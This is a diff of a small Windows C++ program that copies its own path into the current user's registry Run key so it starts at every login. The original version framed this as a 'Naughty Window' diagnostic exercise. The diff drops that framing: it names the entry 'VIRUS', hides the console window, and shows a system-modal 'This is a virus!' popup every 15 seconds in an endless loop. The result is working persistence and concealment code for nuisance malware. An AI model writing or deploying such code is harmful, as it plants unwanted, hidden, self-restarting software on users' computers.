@@ -1,80 +1,83 @@
 #include <windows.h>
 #include <iostream>
-#include <string>
 
-// The name of the registry value we will create
-#define APPLICATION_NAME "NaughtyWindow"
+// The name used to identify the program in the system registry
+constexpr LPCSTR APPLICATION_NAME = "VIRUS";
 
 /**
- * Adds the current executable to the Windows Registry "Run" key
- * so it starts automatically when the user logs in.
+ * Function: AddToStartup
+ * ----------------------
+ * This function registers the program with Windows so that it
+ * starts automatically whenever a user logs into the computer.
+ * * It works by:
+ * 1. Finding the folder path where this specific file is located.
+ * 2. Opening the Windows Registry "Run" key for the current user.
+ * 3. Adding a new entry with the program's name and its location.
  */
-void AddToStartup() {
+static void AddToStartup() {
     HKEY registryKeyHandle;
     char executablePath[MAX_PATH];
-    
-    // 1. Get the full path of the current running .exe file
-    // The first parameter NULL tells the function to get the path of the current process
+
+    // Find the full file path of this program
     DWORD pathLength = GetModuleFileNameA(NULL, executablePath, MAX_PATH);
     if (pathLength == 0) {
-        std::cerr << "Failed to get executable path." << std::endl;
+        std::cerr << "cant find the path" << std::endl;
         return;
     }
 
-    // 2. Open the registry key for the current user's auto-run applications
-    // HKEY_CURRENT_USER doesn't require administrator privileges to write to the 'Run' key
+    // Open the Windows Registry key that handles startup programs
     LSTATUS openResult = RegOpenKeyExA(
-        HKEY_CURRENT_USER, 
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-        0, 
-        KEY_WRITE, 
+        HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0,
+        KEY_WRITE,
         &registryKeyHandle
     );
 
     if (openResult == ERROR_SUCCESS) {
-        // 3. Create or update a value inside that key
-        // We set the value name to "NaughtyWindow" and the data to our file path
+        // Save the program path into the registry
         LSTATUS setResult = RegSetValueExA(
-            registryKeyHandle, 
-            APPLICATION_NAME, 
-            0, 
-            REG_SZ, 
-            (const BYTE*)executablePath, 
+            registryKeyHandle,
+            APPLICATION_NAME,
+            0,
+            REG_SZ,
+            (const BYTE*)executablePath,
             (DWORD)(strlen(executablePath) + 1)
         );
 
         if (setResult == ERROR_SUCCESS) {
-            std::cout << "Persistence established in Registry." << std::endl;
-        } else {
-            std::cerr << "Failed to set Registry value." << std::endl;
+            std::cout << "done. it'll run on boot now" << std::endl;
+        }
+        else {
+            std::cerr << "registry broke" << std::endl;
         }
 
-        // 4. Always close the handle to the registry key when finished
+        // Clean up and close the registry connection
         RegCloseKey(registryKeyHandle);
-    } else {
-        std::cerr << "Failed to open Registry key." << std::endl;
+    }
+    else {
+        std::cerr << "cant open registry" << std::endl;
     }
 }
 
-int main() {
-    // Optional: Hide the console window to act like a background process
-    // HWND consoleWindowHandle = GetConsoleWindow();
-    // ShowWindow(consoleWindowHandle, SW_HIDE);
+int main(void) {
+    // Hide the program window from the user's view
+    HWND consoleWindowHandle = GetConsoleWindow();
+    ShowWindow(consoleWindowHandle, SW_HIDE);
 
-    // Call our function to ensure we run again after a reboot
+    // Setup the automatic startup
     AddToStartup();
 
-    // Loop forever to keep the "malware" running
+    // Loop forever
     while (true) {
-        // Sleep for 15 seconds (15,000 milliseconds) to avoid spamming too fast
+        // Wait for 15 seconds
         Sleep(15000);
 
-        // Display the annoying popup
-        // MB_SYSTEMMODAL makes the window stay on top of other windows
+        // Show an alert box that stays on top of all other windows
         MessageBoxA(
-            NULL, 
-            "This is the Naughty Window bonus exercise.\nCan you find and remove me from your system?", 
-            "Diagnostic Challenge", 
+            NULL,
+            "This is a virus!\n",
+            "VIRUS",
             MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL
         );
     }
